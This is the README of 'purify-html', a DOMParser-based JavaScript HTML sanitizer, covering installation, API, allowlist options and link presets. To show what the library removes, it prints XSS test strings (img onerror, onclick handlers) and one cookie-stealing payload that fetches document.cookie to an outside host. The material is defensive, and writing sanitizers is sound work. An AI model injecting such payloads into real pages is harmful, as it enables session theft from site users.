# purify-html

![size](https://img.shields.io/github/languages/code-size/Aleksandr-JS-Developer/purify-html?style=flat-square)
![](https://badgen.net/bundlephobia/minzip/purify-html?style=flat-square)
![GitHub issues](https://img.shields.io/github/issues-raw/Aleksandr-JS-Developer/purify-html?style=flat-square)
![GitHub closed issues](https://img.shields.io/github/issues-closed-raw/Aleksandr-JS-Developer/purify-html?style=flat-square)

A minimalist client library for cleaning up strings so they can be safely used as HTML.

The main idea is to use the browser API to parse and modify the DOM.

The basic idea is to use the browser API to parse and modify the DOM.
Thus, several goals are achieved at once:

- Actual native parser. The library uses the HTML parser that the browser will use to parse the HTML. Thus, there will be no situation when the payload will work in the browser, but does not work in the parser that the library uses.
- Huge bundle size savings. Since the HTML standard is quite extensive, a quality parser is a rather heavy program that can be easily dispensed with.
- Speed of work. The parser inside DOMParser is native, i.e. written not in JavaScript, but in high-performance C++ (for example, in v8). Thus, parsing is faster than any JavaScript library.
- High % browser support. Although DOMParser has extensive support, you can use a polyfill or even your own parser. See [parserSetup](#setparser) for details.

As a result, parsing with DOMParser is more reliable, faster and does not require precious kilobytes of space in the build.

---

## Install

npm

```bash
npm install purify-html
```

yarn

```bash
yarn add purify-html
```

CDN

```html
<script src="https://unpkg.com/purify-html@latest/dist/index.browser.js"></script>
```

---

## API

```javascript
import PurifyHTML, { setParser } from 'purify-html';

const sanitizer = new PurifyHTML(options);
```

<br>

### function setParser

```javascript
setParser({
  parse(str: string): HTMLElement
  stringify(elem: HTMLElement): string
}): void
```

See [here](#setParser) for details.

<br>

### sanitizer: `object`

#### `sanitize(string): string`

Performs string cleanup according to the rules passed in `options`.

<br>

#### `toHTMLEntities(string): string`

Coerces a string to HTML entities. Very similar to escaping, but for the HTML interpreter.
In HTML, such characters will be rendered "as is".
See more [here](https://www.w3schools.com/html/html_entities.asp).

```javascript
const str = '<br />';

console.log(
  sanitizer.toHTMLEntities(str); // => '&#60;&#98;&#114;&#32;&#47;&#62;'
);
```

---

### options: `Array<string | OptionItem>`

```typescript
type OptionItem {
  name: string,
  // tagname
  attributes: Array<string | AttributesItem>
  // rules for attributes
}

type AttributesItem {
  name: string,
  // attribute name
  value: string | RegExp | Array<string> | { preset: string }
  // rules for attribute value
}
```

## Examples

**via bundler:**

```javascript
import PurifyHTML from 'purify-html';

const allowedTags = [
  // only string
  'hr',

  // as object
  { name: 'br' },

  // attributes check
  { name: 'b', attributes: ['class'] },

  // advanced attributes check
  { name: 'p', attributes: [{ name: 'class' }] },

  // check attributes values (string)
  { name: 'strong', attributes: [{ name: 'id', value: 'awesome-strong-id' }] },

  // check attributes values (RegExp)
  { name: 'em', attributes: [{ name: 'id', value: /awesome-em-id?s/ }] },

  // check attributes values (array of strings)
  {
    name: 'em',
    attributes: [
      { name: 'id', value: ['awesome-strong-id', 'other-awesome-strong-id'] },
    ],
  },

  // use attributes checks preset
  {
    name: 'a',
    attributes: [{ name: 'href', value: { preset: '%https-link%' } }],
  },
];

const sanitizer = new PurifyHTML(allowedTags);

const dangerString = `
  <script> fetch('google.com', { mode: 'no-cors' }) </script>

  <<div></div>img src="1" onerror="alert(1)">
  <img src="1" onerror="alert(1)">

  <b>Bold</b>
  <b class="red">Bold</b>
  <b class="red" onclick="alert(1)">Bold</b>
  <p data-some="123" data-some-else="321">123</p>
  <div></div>
  <hr>
`;

const safeString = sanitizer.sanitize(dangerString);

console.log(safeString);

/*
  &lt;img src="1" onerror="alert(1)"&gt;
  

  <b>Bold</b>
  <b class="red">Bold</b>
  <b class="red">Bold</b>
  <p data-some="123">123</p>
  
  <hr>
*/
```

[Try it](https://codesandbox.io/s/lucid-mclean-6ere1w?file=/src/exampleFromReadme.js).

---

### Via CDN

```html
<!-- ... -->
<head>
  <!-- ... -->
  <script src="https://unpkg.com/purify-html@latest/dist/index.browser.js"></script>
</head>

<!-- ... -->
<script>
  PurifyHTML.setParser(/* ... */);
  const sanitizer = new PurifyHTML.sanitizer(/* ... */);

  sanitizer.sanitize(/* ... */);
</script>
<!-- ... -->
```

Usage for the browser is slightly different from usage with faucets. This is bad, but it had to be done in order not to clog the global scope.

---

## setParser

In some cases, you may want to be able to use your parser instead of DOMParser.

This can be done like this:

```javascript
import PurifyHTML, { setParser } from 'purify-html';

setParser({
  parse(HTMLString: string): HTMLElement {
    // ...
  },
  stringify(element: HTMLElement): string {
    // ...
  },
});

const sanitizer = new PurifyHTML();
// ...
```

**Note!** The root element will be passed to the `stringify` function, and the CONTENT of the element will be expected as a result.

```javascript
const input = document.createElement('div');

input.innerHTML = '<span>span</span>';

stringify(input); // '<span>span</span>' => OK
stringify(input); // '<div><span>span</span></div>' => WRONG
```

---

## Why not `document.createElement(...)`

Because by processing the string like this:

```javascript
const parse = str => {
  const node = document.createElement('div');
  div.innerHTML = str;

  return div;
};
```

In fact, this function, having received a special payload, will RUN it. The following payload will send a network request:
`<img/src/onerror="fetch('www.site.com?q='+encodeURI(document.cookie))">`

And in the case of using DOMParser, the code does not run.

---

## Attributes checks preset list

- `%correct-link%` - only currect link
- `%http-link%` - only http link
- `%https-link%` - only https link
- `%ftp-link%` - only ftp link
- `%https-link-without-search-params%` - delete all search params and force https protocol
- `%http-link-without-search-params%` - delete all search params and force https protocol
- `%same-https-origin%` - only link that lead to the same origin that is currently in `self.location.origin`. + force https protocol
- `%same-http-origin%` - only link that lead to the same origin that is currently in `self.location.origin`. + force http protocol

---

## Browser support

Although browser support is already over 97%, the specification for DOMParser is not yet fully established. [More details](https://caniuse.com/mdn-api_domparser_parsefromstring_html).
